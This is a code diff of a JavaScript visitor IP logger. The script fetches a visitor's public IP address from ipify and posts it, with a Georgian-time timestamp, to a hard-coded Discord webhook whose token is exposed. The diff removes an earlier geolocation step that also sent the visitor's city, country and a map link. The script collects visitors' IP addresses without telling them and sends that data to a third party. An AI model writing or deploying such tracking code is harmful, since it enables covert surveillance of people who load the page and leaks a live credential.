@@ -1,6 +1,4 @@
 const ipifyAPI = "https://api.ipify.org?format=json";
-const ipstackAPI = "http://api.ipstack.com/";
-const apiKey = "YOUR_API_KEY"; // Replace with your ipstack API key
 const webhookURL =
   "https://discord.com/api/webhooks/1367683410989940756/cx2uFFLodvi3paS-hUHxv9waFC4LG2FEqRGLs0bO8nV3CQ-qvPnp8NYbsmiMkMHRteA5";
 
@@ -8,9 +6,7 @@ const webhookURL =
 function getGeorgianTime() {
   const now = new Date();
   const georgianOffset = 4; // UTC+4
-  const georgianTime = new Date(
-    now.getTime() + georgianOffset * 60 * 60 * 1000
-  );
+  const georgianTime = new Date(now.getTime() + georgianOffset * 60 * 60 * 1000);
 
   const year = georgianTime.getFullYear();
   const month = String(georgianTime.getMonth() + 1).padStart(2, "0");
@@ -25,13 +21,16 @@ function getGeorgianTime() {
 // Function to fetch the user's public IP address
 async function getIP() {
   try {
+    console.log("Fetching IP...");
     const response = await fetch(ipifyAPI);
+    if (!response.ok) {
+      throw new Error(`ipify API returned status ${response.status}`);
+    }
     const data = await response.json();
     if (!data.ip) {
-      console.error("No IP data received from ipify.");
-      return null;
+      throw new Error("No IP address found in ipify response.");
     }
-    console.log("Fetched IP:", data.ip); // Log the fetched IP
+    console.log("Fetched IP:", data.ip);
     return data.ip;
   } catch (error) {
     console.error("Error fetching IP:", error);
@@ -39,31 +38,8 @@ async function getIP() {
   }
 }
 
-// Function to fetch geolocation data for the given IP address using ipstack
-async function getGeolocation(ip) {
-  try {
-    const response = await fetch(`${ipstackAPI}${ip}?access_key=${apiKey}`);
-    const data = await response.json();
-    if (data.error) {
-      console.error("Error fetching geolocation:", data.error.info);
-      return null;
-    }
-    console.log("Full Geolocation Data:", data); // Log full geolocation data for debugging
-    return {
-      city: data.city,
-      region: data.region_name,
-      country: data.country_name,
-      lat: data.latitude,
-      lon: data.longitude,
-    };
-  } catch (error) {
-    console.error("Error fetching geolocation:", error);
-    return null;
-  }
-}
-
-// Function to send IP and location data to Discord webhook
-async function sendToDiscord(ip, location) {
+// Function to send time and IP address to Discord webhook
+async function sendToDiscord(ip) {
   if (!ip) {
     console.error("IP address is null or undefined.");
     return;
@@ -71,15 +47,12 @@ async function sendToDiscord(ip, location) {
 
   const timestamp = getGeorgianTime();
 
-  const locationMessage = location
-    ? `Location: ${location.city}, ${location.region}, ${location.country}\nMap: [Google Maps](https://www.google.com/maps?q=${location.lat},${location.lon})`
-    : "Location: Could not fetch location or map.\nMap: N/A";
-
   const payload = {
-    content: `IP Address: ${ip}\nTimestamp: ${timestamp}\n${locationMessage}`,
+    content: `IP Address: ${ip}\nTimestamp: ${timestamp}`,
   };
 
   try {
+    console.log("Sending data to Discord...");
     const response = await fetch(webhookURL, {
       method: "POST",
       headers: {
@@ -88,26 +61,20 @@ async function sendToDiscord(ip, location) {
       body: JSON.stringify(payload),
     });
 
-    if (response.ok) {
-      console.log("IP and location sent to Discord successfully!");
-    } else {
-      console.error("Error sending data to Discord:", response.statusText);
+    if (!response.ok) {
+      throw new Error(`Discord webhook returned status ${response.status}`);
     }
+    console.log("IP and time sent to Discord successfully!");
   } catch (error) {
     console.error("Error sending data to Discord:", error);
   }
 }
 
-// Main function to fetch IP, geolocation, and send to Discord
+// Main function to fetch IP and send to Discord
 async function main() {
   const ip = await getIP();
   if (ip) {
-    const location = await getGeolocation(ip);
-    if (location) {
-      await sendToDiscord(ip, location);
-    } else {
-      console.error("Could not fetch location.");
-    }
+    await sendToDiscord(ip);
   } else {
     console.error("Could not retrieve IP address.");
   }
